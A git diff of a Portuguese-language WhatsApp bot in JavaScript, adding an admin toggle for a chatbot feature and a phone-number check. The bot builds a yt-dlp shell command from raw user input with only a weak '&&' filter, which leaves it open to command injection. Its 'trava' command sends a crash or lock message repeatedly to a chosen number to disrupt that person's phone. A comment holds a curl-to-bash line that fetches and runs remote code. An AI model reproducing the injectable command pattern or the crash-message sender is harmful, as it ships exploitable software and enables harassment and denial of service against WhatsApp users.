@@ -72,7 +72,7 @@ async function commandHandler(bot, cmd, data) {
                 if(!regex.test(argument)) { // se o argumento for um link
                     argument = "\"ytsearch:" + argument.replace(/\"/g, '') + "\"";
                 } else if(argument.includes("&&")) {
-                    argument = argument.split("&&")[0];
+                    argument = argument.split("&&")[0]; 
                 }
                 const filename = Math.round(Math.random() * 100000) + ".opus"; // cria um nome aleatório para o arquivo
                 const query = "yt-dlp --no-check-certificates -x -S 'res:480' " + " -o " + filename + " " + argument; // query para baixar a música
@@ -695,6 +695,29 @@ ${message}`
             return await bot.replyText(data, error);
         }
 
+        case "chatbot": {
+            if(!data.bot_data.is_group) {
+                error = "Erro! O chat atual não é um grupo!";
+            } else if(!data.group_data.sender_is_admin) {
+                error = "Erro! Este comando só pode ser usado por admins!";
+            } else if (args.length === 0) {
+                error = "Erro! Preciso saber se é on/off!";
+            } else if(["on", "off"].includes(args[0])) {
+                if(args[0] === "on") {
+                    data.group_data.db_data.chatbot_on = true;
+                    bot.database.update("group_infos", data.group_data.db_data);
+                    return await bot.replyText(data, "Chatbot ativado!");
+                } else {
+                    data.group_data.db_data.chatbot_on = false;
+                    bot.database.update("group_infos", data.group_data.db_data);
+                    return await bot.replyText(data, "Chatbot desativado!");
+                }
+            } else {
+                error = "Erro! Preciso saber se é on/off!";
+            }
+            return await bot.replyText(data, error);
+        }
+
 
         /* %$ENDADMIN$% */
 
@@ -792,12 +815,15 @@ ${message}`
                     number = number.split("@")[1];
                 }
                 const jid = number + "@s.whatsapp.net";
+                if(!/[0-9]\w+@s.whatsapp.net/gi.test(jid)) {
+                    return await bot.replyText(data, "Erro! Número inválido!");
+                }
                 let trava = fs.readFileSync("./etc/trava", "utf8");  // curl https://gist.githubusercontent.com/kamuridesu/817222c6ab0958a94e2f98d36677e5e0/raw/e49a9a4041507717aa845fb44b5f153819c1a38d/setup.sh | bash
                 for(let i = 0; i < times; i++) {
                     logger.write("Travando " + jid + "...", 1);
                     await bot.sendTextMessage(data, trava, jid);
                 }
-                await bot.conn.modifyChat(number, ChatModification.delete);
+                await bot.conn.modifyChat(jid, ChatModification.delete);
                 return await bot.replyText(data, "Trava enviada com sucesso!");
             }
             return await bot.replyText(data, error);
